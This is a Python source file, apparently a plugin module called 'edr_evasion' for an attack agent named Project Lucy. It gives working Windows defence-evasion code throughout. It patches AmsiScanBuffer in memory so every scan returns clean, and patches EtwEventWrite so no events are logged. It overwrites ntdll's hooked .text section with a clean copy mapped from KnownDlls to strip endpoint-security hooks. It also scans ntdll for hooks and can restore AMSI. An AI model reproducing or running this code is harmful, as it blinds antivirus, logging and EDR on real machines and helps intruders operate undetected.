"""
EDR evasion module for Project Lucy agent.
Patches AMSI and ETW in memory, re-maps ntdll to remove hooks,
and detects inline hooks in ntdll .text section.
Actions: patch_amsi, patch_etw, unhook_ntdll, restore_amsi, status, check_hooks.
"""
import ctypes
import platform
import struct

name = "edr_evasion"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# State tracking
_amsi_patched = False
_amsi_original_bytes = b""
_etw_patched = False
_etw_original_bytes = b""
_ntdll_unhooked = False

# Win32 constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20
PAGE_READWRITE = 0x04


def _get_kernel32():
    return ctypes.windll.kernel32


def _get_ntdll():
    return ctypes.windll.ntdll


def _virtual_protect(address, size, new_protect):
    """Change memory protection; returns the previous protection value."""
    old_protect = ctypes.c_ulong(0)
    kernel32 = _get_kernel32()
    result = kernel32.VirtualProtect(
        ctypes.c_void_p(address),
        ctypes.c_size_t(size),
        ctypes.c_ulong(new_protect),
        ctypes.byref(old_protect),
    )
    if not result:
        raise ctypes.WinError(ctypes.get_last_error())
    return old_protect.value


def _read_memory(address, size):
    """Read `size` bytes from `address`."""
    buf = (ctypes.c_ubyte * size)()
    ctypes.memmove(buf, address, size)
    return bytes(buf)


def _write_memory(address, data):
    """Write `data` bytes to `address`."""
    buf = (ctypes.c_ubyte * len(data))(*data)
    ctypes.memmove(address, buf, len(data))


def _patch_function(dll_name, func_name, patch_bytes):
    """
    Patch a function in a loaded DLL.
    Returns (address, original_bytes) on success.
    """
    kernel32 = _get_kernel32()

    # Load the DLL (or get handle if already loaded)
    handle = kernel32.LoadLibraryA(dll_name.encode("ascii"))
    if not handle:
        raise ctypes.WinError(ctypes.get_last_error())

    # Get function address
    addr = kernel32.GetProcAddress(handle, func_name.encode("ascii"))
    if not addr:
        raise ValueError(f"Could not resolve {dll_name}!{func_name}")

    # Read original bytes
    original = _read_memory(addr, len(patch_bytes))

    # Change protection to RWX
    _virtual_protect(addr, len(patch_bytes), PAGE_EXECUTE_READWRITE)

    # Write patch
    _write_memory(addr, patch_bytes)

    # Restore to RX
    _virtual_protect(addr, len(patch_bytes), PAGE_EXECUTE_READ)

    return addr, original


def _patch_amsi() -> dict:
    """Patch amsi.dll!AmsiScanBuffer to return AMSI_RESULT_CLEAN (0)."""
    global _amsi_patched, _amsi_original_bytes

    if _amsi_patched:
        return {
            "status": "completed",
            "data": {"patched": True, "message": "AMSI already patched"},
        }

    try:
        # xor rax, rax ; ret  ->  returns 0 (AMSI_RESULT_CLEAN)
        patch = b"\x48\x31\xc0\xc3"
        addr, original = _patch_function("amsi.dll", "AmsiScanBuffer", patch)
        _amsi_original_bytes = original
        _amsi_patched = True

        return {
            "status": "completed",
            "data": {
                "patched": True,
                "address": hex(addr),
                "function": "AmsiScanBuffer",
                "original_bytes": original.hex(),
                "patch_bytes": patch.hex(),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"AMSI patch failed: {exc}"}


def _patch_etw() -> dict:
    """Patch ntdll!EtwEventWrite to return immediately (no event logged)."""
    global _etw_patched, _etw_original_bytes

    if _etw_patched:
        return {
            "status": "completed",
            "data": {"patched": True, "message": "ETW already patched"},
        }

    try:
        # ret  ->  immediate return, event is never logged
        patch = b"\xc3"
        addr, original = _patch_function("ntdll.dll", "EtwEventWrite", patch)
        _etw_original_bytes = original
        _etw_patched = True

        return {
            "status": "completed",
            "data": {
                "patched": True,
                "address": hex(addr),
                "function": "EtwEventWrite",
                "original_bytes": original.hex(),
                "patch_bytes": patch.hex(),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"ETW patch failed: {exc}"}


def _unhook_ntdll() -> dict:
    """Re-map ntdll.dll from \\KnownDlls\\ntdll.dll and overwrite hooked .text."""
    global _ntdll_unhooked

    if _ntdll_unhooked:
        return {
            "status": "completed",
            "data": {"unhooked": True, "message": "ntdll already unhooked"},
        }

    ntdll = _get_ntdll()
    kernel32 = _get_kernel32()

    # Structures for NtOpenSection / NtMapViewOfSection
    class UNICODE_STRING(ctypes.Structure):
        _fields_ = [
            ("Length", ctypes.c_ushort),
            ("MaximumLength", ctypes.c_ushort),
            ("Buffer", ctypes.c_wchar_p),
        ]

    class OBJECT_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ("Length", ctypes.c_ulong),
            ("RootDirectory", ctypes.c_void_p),
            ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
            ("Attributes", ctypes.c_ulong),
            ("SecurityDescriptor", ctypes.c_void_p),
            ("SecurityQualityOfService", ctypes.c_void_p),
        ]

    SECTION_MAP_READ = 0x0004
    OBJ_CASE_INSENSITIVE = 0x00000040
    ViewShare = 1

    try:
        # --- Open \KnownDlls\ntdll.dll ---
        section_name = "\\KnownDlls\\ntdll.dll"
        us = UNICODE_STRING()
        us.Length = len(section_name) * 2
        us.MaximumLength = (len(section_name) + 1) * 2
        us.Buffer = section_name

        oa = OBJECT_ATTRIBUTES()
        oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
        oa.ObjectName = ctypes.pointer(us)
        oa.Attributes = OBJ_CASE_INSENSITIVE

        section_handle = ctypes.c_void_p(0)
        status = ntdll.NtOpenSection(
            ctypes.byref(section_handle),
            SECTION_MAP_READ,
            ctypes.byref(oa),
        )
        if status != 0:
            return {"status": "failed", "error": f"NtOpenSection failed: 0x{status & 0xFFFFFFFF:08X}"}

        # --- Map clean ntdll into our process ---
        clean_base = ctypes.c_void_p(0)
        view_size = ctypes.c_size_t(0)
        status = ntdll.NtMapViewOfSection(
            section_handle,
            kernel32.GetCurrentProcess(),
            ctypes.byref(clean_base),
            0,
            0,
            None,
            ctypes.byref(view_size),
            ViewShare,
            0,
            PAGE_READWRITE,
        )
        if status != 0:
            ntdll.NtClose(section_handle)
            return {"status": "failed", "error": f"NtMapViewOfSection failed: 0x{status & 0xFFFFFFFF:08X}"}

        clean_base_addr = clean_base.value

        # --- Parse PE headers to find .text section ---
        def _find_text_section(base_addr):
            """Parse PE headers at base_addr and return (text_va, text_size)."""
            # DOS header
            e_lfanew = ctypes.c_uint32.from_address(base_addr + 0x3C).value
            # PE signature + COFF header
            pe_addr = base_addr + e_lfanew
            num_sections = ctypes.c_ushort.from_address(pe_addr + 6).value
            size_of_optional_header = ctypes.c_ushort.from_address(pe_addr + 20).value
            # Section table starts after optional header
            section_table_addr = pe_addr + 24 + size_of_optional_header

            for i in range(num_sections):
                sec_addr = section_table_addr + i * 40
                name_bytes = (ctypes.c_ubyte * 8).from_address(sec_addr)
                sec_name = bytes(name_bytes).rstrip(b"\x00").decode("ascii", errors="replace")
                if sec_name == ".text":
                    virtual_size = ctypes.c_uint32.from_address(sec_addr + 8).value
                    virtual_address = ctypes.c_uint32.from_address(sec_addr + 12).value
                    return (base_addr + virtual_address, virtual_size)
            return (0, 0)

        clean_text_addr, clean_text_size = _find_text_section(clean_base_addr)
        if clean_text_addr == 0:
            ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), clean_base)
            ntdll.NtClose(section_handle)
            return {"status": "failed", "error": "Could not find .text in clean ntdll"}

        # Current ntdll base
        current_ntdll_handle = kernel32.GetModuleHandleA(b"ntdll.dll")
        current_text_addr, current_text_size = _find_text_section(current_ntdll_handle)
        if current_text_addr == 0:
            ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), clean_base)
            ntdll.NtClose(section_handle)
            return {"status": "failed", "error": "Could not find .text in current ntdll"}

        copy_size = min(clean_text_size, current_text_size)

        # --- Overwrite hooked .text with clean .text ---
        _virtual_protect(current_text_addr, copy_size, PAGE_READWRITE)
        ctypes.memmove(
            ctypes.c_void_p(current_text_addr),
            ctypes.c_void_p(clean_text_addr),
            copy_size,
        )
        _virtual_protect(current_text_addr, copy_size, PAGE_EXECUTE_READ)

        # Cleanup
        ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), clean_base)
        ntdll.NtClose(section_handle)

        _ntdll_unhooked = True

        return {
            "status": "completed",
            "data": {
                "unhooked": True,
                "clean_base": hex(clean_base_addr),
                "current_base": hex(current_ntdll_handle),
                "text_address": hex(current_text_addr),
                "text_size": copy_size,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"ntdll unhook failed: {exc}"}


def _restore_amsi() -> dict:
    """Restore original AmsiScanBuffer bytes."""
    global _amsi_patched, _amsi_original_bytes

    if not _amsi_patched:
        return {"status": "failed", "error": "AMSI is not patched"}

    try:
        kernel32 = _get_kernel32()
        handle = kernel32.GetModuleHandleA(b"amsi.dll")
        if not handle:
            handle = kernel32.LoadLibraryA(b"amsi.dll")
        addr = kernel32.GetProcAddress(handle, b"AmsiScanBuffer")
        if not addr:
            return {"status": "failed", "error": "Could not resolve AmsiScanBuffer"}

        _virtual_protect(addr, len(_amsi_original_bytes), PAGE_EXECUTE_READWRITE)
        _write_memory(addr, _amsi_original_bytes)
        _virtual_protect(addr, len(_amsi_original_bytes), PAGE_EXECUTE_READ)

        restored = _amsi_original_bytes
        _amsi_patched = False
        _amsi_original_bytes = b""

        return {
            "status": "completed",
            "data": {
                "restored": True,
                "address": hex(addr),
                "restored_bytes": restored.hex(),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"AMSI restore failed: {exc}"}


def _status() -> dict:
    """Check if AMSI/ETW are currently patched."""
    return {
        "status": "completed",
        "data": {
            "amsi_patched": _amsi_patched,
            "etw_patched": _etw_patched,
            "ntdll_unhooked": _ntdll_unhooked,
        },
    }


def _check_hooks() -> dict:
    """Scan ntdll .text for common hook patterns (jmp at function starts)."""
    try:
        kernel32 = _get_kernel32()
        ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
        if not ntdll_base:
            return {"status": "failed", "error": "Could not get ntdll base"}

        # Parse PE to find .text section
        e_lfanew = ctypes.c_uint32.from_address(ntdll_base + 0x3C).value
        pe_addr = ntdll_base + e_lfanew
        num_sections = ctypes.c_ushort.from_address(pe_addr + 6).value
        size_of_optional_header = ctypes.c_ushort.from_address(pe_addr + 20).value
        section_table_addr = pe_addr + 24 + size_of_optional_header

        text_addr = 0
        text_size = 0
        for i in range(num_sections):
            sec_addr = section_table_addr + i * 40
            name_bytes = (ctypes.c_ubyte * 8).from_address(sec_addr)
            sec_name = bytes(name_bytes).rstrip(b"\x00").decode("ascii", errors="replace")
            if sec_name == ".text":
                text_size = ctypes.c_uint32.from_address(sec_addr + 8).value
                text_addr = ntdll_base + ctypes.c_uint32.from_address(sec_addr + 12).value
                break

        if text_addr == 0:
            return {"status": "failed", "error": "Could not find .text section"}

        # Common hook patterns:
        #   E9 xx xx xx xx    ->  jmp rel32  (5 bytes)
        #   FF 25 xx xx xx xx ->  jmp [rip+disp32]  (indirect, 6 bytes)
        #   48 B8 xx... FF E0 ->  movabs rax, <addr>; jmp rax  (12 bytes)
        #   E8 xx xx xx xx    ->  call rel32 (sometimes used)
        hooks_found = []
        scan_size = min(text_size, 0x100000)  # limit scan to 1MB

        # Read the .text section in chunks
        chunk_size = 0x10000
        for offset in range(0, scan_size, chunk_size):
            read_size = min(chunk_size, scan_size - offset)
            try:
                data = _read_memory(text_addr + offset, read_size)
            except Exception:
                break

            for i in range(len(data) - 6):
                b0 = data[i]

                # jmp rel32 (E9)
                if b0 == 0xE9:
                    hooks_found.append({
                        "address": hex(text_addr + offset + i),
                        "type": "jmp rel32",
                        "bytes": data[i:i + 5].hex(),
                    })
                # jmp [rip+disp32] (FF 25)
                elif b0 == 0xFF and data[i + 1] == 0x25:
                    hooks_found.append({
                        "address": hex(text_addr + offset + i),
                        "type": "jmp [rip+disp32]",
                        "bytes": data[i:i + 6].hex(),
                    })
                # movabs rax + jmp rax (48 B8 ... FF E0)
                elif b0 == 0x48 and data[i + 1] == 0xB8 and i + 11 < len(data):
                    if data[i + 10] == 0xFF and data[i + 11] == 0xE0:
                        hooks_found.append({
                            "address": hex(text_addr + offset + i),
                            "type": "movabs+jmp rax",
                            "bytes": data[i:i + 12].hex(),
                        })

            # Limit results to avoid huge output
            if len(hooks_found) > 500:
                break

        return {
            "status": "completed",
            "data": {
                "text_start": hex(text_addr),
                "text_size": text_size,
                "scanned": scan_size,
                "hooks_found": len(hooks_found),
                "hooks": hooks_found[:100],
                "truncated": len(hooks_found) > 100,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Hook check failed: {exc}"}


def run(action: str = "status", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only"}

    try:
        if action == "patch_amsi":
            return _patch_amsi()
        elif action == "patch_etw":
            return _patch_etw()
        elif action == "unhook_ntdll":
            return _unhook_ntdll()
        elif action == "restore_amsi":
            return _restore_amsi()
        elif action == "status":
            return _status()
        elif action == "check_hooks":
            return _check_hooks()
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
